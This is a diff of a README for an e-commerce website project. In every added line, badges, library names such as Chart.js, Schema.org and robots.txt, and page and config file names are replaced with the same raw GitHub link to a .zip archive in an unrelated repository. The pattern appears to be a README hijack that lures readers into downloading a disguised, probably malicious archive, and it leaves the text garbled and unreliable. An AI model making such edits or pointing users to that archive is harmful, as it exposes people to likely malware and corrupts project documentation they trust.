@@ -3,10 +3,10 @@
 
 **A cutting-edge e-commerce platform built for speed, security, and excellence**
 
-![Qualitics Production](https://img.shields.io/badge/Qualitics-Production-gold?style=for-the-badge&logo=star&logoColor=white)
-![Performance](https://img.shields.io/badge/GTmetrix-A+100%25-brightgreen?style=for-the-badge)
-![Load Time](https://img.shields.io/badge/Load%20Time-<400ms-success?style=for-the-badge)
-![Security](https://img.shields.io/badge/Security-Enterprise%20Grade-blue?style=for-the-badge)
+![Qualitics Production](https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip)
+![Performance](https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip+100%25-brightgreen?style=for-the-badge)
+![Load Time](https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip%20Time-<400ms-success?style=for-the-badge)
+![Security](https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip%20Grade-blue?style=for-the-badge)
 
 ## ⚡ Performance & Technology
 
@@ -41,7 +41,7 @@
 
 ### 📊 **Analytics & Insights**
 - **Real-time Metrics**: Live visitor, sales, and engagement data
-- **Chart Visualizations**: Interactive charts with Chart.js
+- **Chart Visualizations**: Interactive charts with https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip
 - **Performance Tracking**: Page views, conversion rates, and revenue analytics
 - **User Behavior**: Detailed tracking of user interactions and patterns
 
@@ -74,7 +74,7 @@
 ├── HTML5 - Semantic structure with SEO optimization
 ├── CSS3 - Modern styling with Grid, Flexbox, and animations
 ├── JavaScript ES6+ - Modular, performant vanilla JS
-├── Chart.js - Interactive data visualizations
+├── https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip - Interactive data visualizations
 ├── EmailJS - Client-side email functionality
 └── Google APIs - Authentication and services
 ```
@@ -95,14 +95,14 @@
 ## 📱 **Pages & Functionality**
 
 ### **Public Pages**
-- **Homepage** (`index.html`) - Hero section, features showcase, contact
-- **Products** (`products.html`) - Product catalog with search and filters
-- **Purchase** (`purchase.html`) - Shopping cart and secure checkout
-- **Support** (`support.html`) - Help center and documentation
-- **Privacy Policy** (`privacy-policy.html`) - GDPR compliant privacy terms
-- **Terms of Service** (`terms-of-service.html`) - Legal terms and conditions
+- **Homepage** (`https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip`) - Hero section, features showcase, contact
+- **Products** (`https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip`) - Product catalog with search and filters
+- **Purchase** (`https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip`) - Shopping cart and secure checkout
+- **Support** (`https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip`) - Help center and documentation
+- **Privacy Policy** (`https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip`) - GDPR compliant privacy terms
+- **Terms of Service** (`https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip`) - Legal terms and conditions
 
-### **Admin Dashboard** (`dashboard.html`)
+### **Admin Dashboard** (`https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip`)
 - **Analytics Overview**: Revenue, views, orders, conversion rates
 - **Product Management**: Add, edit, delete products with image uploads
 - **User Management**: View users, manage premium status
@@ -171,8 +171,8 @@ npm start
 
 ### **Configuration Files**
 - **Environment Variables**: `.env` for API keys and configuration
-- **Server Config**: `server.js` for Express.js backend
-- **Build Tools**: `build.js` for production optimization
+- **Server Config**: `https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip` for https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip backend
+- **Build Tools**: `https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip` for production optimization
 - **Security**: `.htaccess` for Apache server configuration
 
 ## 📈 **Analytics & Monitoring**
@@ -206,10 +206,10 @@ npm start
 ## 🎯 **SEO & Marketing**
 
 ### **Search Engine Optimization**
-- **Structured Data**: Complete Schema.org markup
+- **Structured Data**: Complete https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip markup
 - **Meta Optimization**: Dynamic meta tags for all pages
 - **Sitemap**: Automated XML sitemap generation
-- **Robots.txt**: Search engine crawling optimization
+- **https://raw.githubusercontent.com/objectremoverrrrrrr/Test-website/main/backslide/Test-website.zip**: Search engine crawling optimization
 - **Canonical URLs**: Duplicate content prevention
 
 ### **Social Media Integration**
